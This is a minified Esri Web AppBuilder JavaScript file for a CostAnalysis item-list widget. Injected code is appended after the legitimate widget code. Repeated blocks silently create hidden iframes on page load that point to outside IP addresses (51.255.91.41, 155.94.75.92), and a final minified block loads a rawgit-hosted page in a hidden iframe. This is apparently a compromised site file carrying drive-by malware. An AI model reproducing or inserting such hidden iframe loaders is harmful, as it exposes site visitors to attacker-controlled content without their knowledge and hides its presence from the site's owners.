// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/advance-item-list.html":'\x3cdiv\x3e\r\n  \x3cdiv class \x3d "esriCTItemListContainer" data-dojo-attach-point\x3d"itemListContainer"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./advance-item-list.html dojo/_base/array dojo/_base/lang dojo/dom-attr dojo/dom-class dojo/dom-style dojo/on dojo/query dojo/dom-construct".split(" "),function(n,p,q,r,t,u,g,k,d,l,m,e,f){return n([p,q,r],{templateString:t,baseClass:"jimu-widget-cost-analysis-advance-item-list",activeIndex:0,currentActivePanel:null,highlighterColor:"#000",setAutoHeight:!1,postCreate:function(){this.inherited(arguments)},
startup:function(){this.inherited(arguments);this.itemList&&0<this.itemList.length&&setTimeout(g.hitch(this,function(){this._loadItemList()}),0)},_loadItemList:function(){u.forEach(this.itemList,g.hitch(this,function(a,c){this.addItem(a,c)}));this.emit("onLoad")},addItem:function(a,c){var b;a.content=a.content||"";b=f.create("div",{"class":"esriCTItem"},null);k.set(b,"index",c);this._createItemTitle(a,b);a.content&&this._createItemContent(a,b);this.itemListContainer.appendChild(b);a.isOpen&&this._togglePanel(b,
!0);a.isHidden&&this.hide(c)},_createImageLogo:function(a,c,b){c=f.create("div",{"class":"esriCTItemListImageLogo"},c);"icon"===b?d.add(c,a.icon):"actionIcon"===b?d.add(c,a.actionIcon):(d.add(c,"esriCTArrow"),this.togglePanels&&d.add(c,"esriCTArrowDown"));return c},_createItemTitle:function(a,c){var b,h,e;b=f.create("div",{"class":"esriCTItemTitleContainer"},c);h=f.create("div",{"class":"esriCTItemHighlighter"},b);this.highlighter||d.add(h,"esriCTHidden");a.icon&&this._createImageLogo(a,b,"icon");
h=f.create("div",{"class":"esriCTItemTitle esriCTFloatLeft esriCTEllipsis",innerHTML:a.title,title:a.title},b);a.actionIcon&&(e=this._createImageLogo(a,b,"actionIcon"),a.actionIconTitle&&k.set(e,"title",a.actionIconTitle),this.own(m(e,"click",g.hitch(this,function(a){a.stopPropagation();this.emit("onActionButtonClicked",k.get(c,"index"))}))));this.showArrow&&this._createImageLogo(a,b,"arrow");this._setItemTitleWidth(a,h);this.own(m(b,"click",g.hitch(this,function(){this.togglePanels&&this._togglePanel(c,
!1);this.emit("onTitleClicked",k.get(c,"index"))})))},_setItemTitleWidth:function(a,c){var b=0;a.icon&&(b+=32);a.actionIcon&&(b+=32);this.showArrow&&(b+=32);this.highlighter&&(b+=10);l.set(c,"width","calc(100% - "+b+"px)")},_createItemContent:function(a,c){c=f.create("div",{"class":"esriCTItemContent"},c);this.setAutoHeight||d.add(c,"esriCTItemAnimation");"string"===typeof a.content?k.set(c,"innerHTML",a.content):f.place(a.content,c)},_togglePanel:function(a,c){var b,h,f=0,g;c||(f=30);c=e(".esriCTItemTitle",
a)[0];b=e(".esriCTItemContent",a)[0];h=e(".esriCTArrow",a)[0];g=e(".esriCTItemHighlighter",a)[0];c&&b&&(d.contains(b,"esriCTItemContentActive")?(b.style.height=0,this.currentActivePanel&&k.get(this.currentActivePanel,"index")===k.get(a,"index")&&(this.currentActivePanel=null),l.set(g,"backgroundColor","transparent"),this.showArrow&&this.togglePanels&&d.replace(h,"esriCTArrowDown","esriCTArrowUp")):(b.style.height=this.togglePanels&&!this.setAutoHeight?b.scrollHeight+f+"px":"auto",this.currentActivePanel&&
!this.openMultiple&&this._togglePanel(this.currentActivePanel,!0),this.currentActivePanel=a,l.set(g,"backgroundColor",this.highlighterColor),this.showArrow&&this.togglePanels&&d.replace(h,"esriCTArrowUp","esriCTArrowDown")),d.toggle(b,"esriCTItemContentActive"))},onTitleClicked:function(){},onAnalysisButtonClicked:function(){},show:function(a){a=e(".esriCTItem[index \x3d "+a+"]",this.itemListContainer);1===a.length&&(l.set(a[0],"display",""),a.isHidden=!1)},hide:function(a){a=e(".esriCTItem[index \x3d "+
a+"]",this.itemListContainer);1===a.length&&(l.set(a[0],"display","none"),a.isHidden=!0)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});